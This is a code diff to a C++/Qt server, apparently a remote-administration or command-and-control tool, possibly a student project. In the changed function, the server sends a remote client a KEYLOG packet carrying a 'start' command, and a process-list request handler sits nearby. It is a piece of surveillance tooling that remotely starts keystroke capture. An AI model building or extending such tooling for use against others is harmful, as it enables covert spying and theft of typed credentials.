@@ -140,20 +140,29 @@ void ServerApp::onStartKeylogger(const QString& clientId)
 {
     qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
 
-    uint32_t sessionId = 0;
-    LPTF_Packet packet(
-        1,                         // version
-        PacketType::KEYLOG,        // type
-        0,                         // flags
-        0,                         // packetId
-        sessionId,                 // sessionId
-        {}                         // payload vide
-    );
-    auto raw = packet.serialize();
-    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
+ // Prepare the "start" command as payload
+const std::string cmdStart = "start";
+const std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
 
-    sendToClientInternal(clientId, qraw);
-    qDebug() << "[ServerApp] Keylogger started for" << clientId;
+// Use appropriate packetId and sessionId if you track them per client/session
+const uint32_t packetId = 1;    // or increment if needed
+const uint32_t sessionId = 0;   // or your actual sessionId
+
+LPTF_Packet packet(
+    1,                         // version
+    PacketType::KEYLOG,        // type
+    0,                         // flags
+    packetId,                  // packetId (match terminal or logic)
+    sessionId,                 // sessionId (match terminal or logic)
+    startPayload               // payload: "start"
+);
+
+const auto raw = packet.serialize();
+const QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
+
+sendToClientInternal(clientId, qraw);
+
+qDebug() << "[ServerApp] Keylogger started for" << clientId;
 }
 
 void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
